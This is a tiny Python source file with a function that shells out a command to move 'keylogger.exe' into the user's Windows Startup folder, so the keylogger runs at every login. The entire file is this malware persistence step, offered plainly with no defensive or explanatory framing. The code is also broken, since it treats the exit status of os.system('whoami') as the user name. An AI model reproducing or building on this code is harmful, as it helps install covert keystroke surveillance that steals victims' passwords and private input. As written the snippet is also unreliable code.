import os
def windowsKey():
    #moves the keylogger to startup files
    user = os.system("whoami")
    os.system("move keylogger.exe C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")